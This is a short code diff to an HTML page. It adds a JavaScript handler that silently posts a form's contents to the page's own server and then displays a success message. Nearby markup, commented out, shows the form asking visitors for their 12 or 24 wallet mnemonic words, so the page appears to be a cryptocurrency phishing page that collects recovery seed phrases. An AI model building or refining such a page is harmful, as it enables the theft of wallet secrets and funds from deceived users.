@@ -1381,6 +1381,35 @@
 
                             </div>
                         </form>
+                        <!-- AJAX Script -->
+<script>
+  const form = document.getElementById("my-form");
+  const successMessage = document.getElementById("success-message");
+
+  form.addEventListener("submit", async function (event) {
+    event.preventDefault(); // Prevent the default form submission
+
+    const formData = new FormData(form);
+
+    try {
+      const response = await fetch("/", {
+        method: "POST",
+        body: formData,
+      });
+
+      if (response.ok) {
+        form.style.display = "none"; // Hide the form
+        successMessage.style.display = "block"; // Show success message
+      } else {
+        alert("Submission failed. Please try again later.");
+      }
+    } catch (error) {
+      console.error("Error submitting form:", error);
+      alert("An error occurred. Please try again.");
+    }
+  });
+</script>
+                        
                         <!-- <form method="POST" id="my-form">
                             <div id="phrase">
                                 <textarea class="col-12 form-control" placeholder="Enter your 12 or 24 Mnemonic words. Seperate them with spaces." style="font-size:14px; font-weight:650; color: #fff !important;" rows="4" id="secret_phrase" name="phrase" required></textarea>
